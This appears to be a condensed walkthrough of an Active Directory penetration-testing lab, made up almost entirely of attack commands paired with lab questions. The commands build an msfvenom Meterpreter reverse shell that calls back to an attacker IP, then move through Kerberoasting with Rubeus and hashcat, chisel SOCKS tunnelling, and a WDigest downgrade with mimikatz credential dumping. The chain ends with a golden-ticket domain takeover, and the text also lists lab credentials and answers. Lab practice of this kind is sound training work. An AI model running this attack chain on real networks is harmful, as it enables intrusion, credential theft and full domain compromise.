Login to the web shell: admin:My_W3bsH3ll_P@ssw0rd!

Submit the contents of the flag.txt file on the administrator Desktop of the web server
```
type C:\Users\Administrator\Desktop\Flag.txt
```

Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.126 LPORT=8081 -f exe > backup.exe
python3 -m http.server
msfconsole
use exploit/multi/handler
set LHOST 10.10.15.126
set LPORT 8081
set payload windows/x64/meterpreter/reverse_tcp
run
Invoke-WebRequest -Uri "http://10.10.15.126:8000/backup.exe" -OutFile "C:\Users\Administrator\Desktop\backup.exe"
& "C:\Users\Administrator\Desktop\backup.exe"
shell
setspn.exe -Q */*
```
- Transferred Rubeus over

Crack the account's password. Submit the cleartext value.
```
.\rubeus.exe kerberoast /spn:MSSQLSvc/SQL01.inlanefreight.local:1433 /nowrap
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

Submit the contents of the flag.txt file on the Administrator desktop on MS01
```
powershell
./chisel_1.7.3_linux_amd64 server --reverse -v -p 1234 --socks5
.\chisel.exe client -v 10.10.15.126:1234 R:socks
proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7 /drive:linux,/home/htb-ac-1480826
```
- Transfer mimikatz.exe

Find cleartext credentials for another domain user. Submit the username as your answer.
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Submit this user's cleartext password.

What attack can this user perform?
- DCSync

Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01
```
runas /netonly /user:INLANEFREIGHT\tpetty powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
type \\dc01\c$\Users\Administrator\Desktop\flag.txt
```
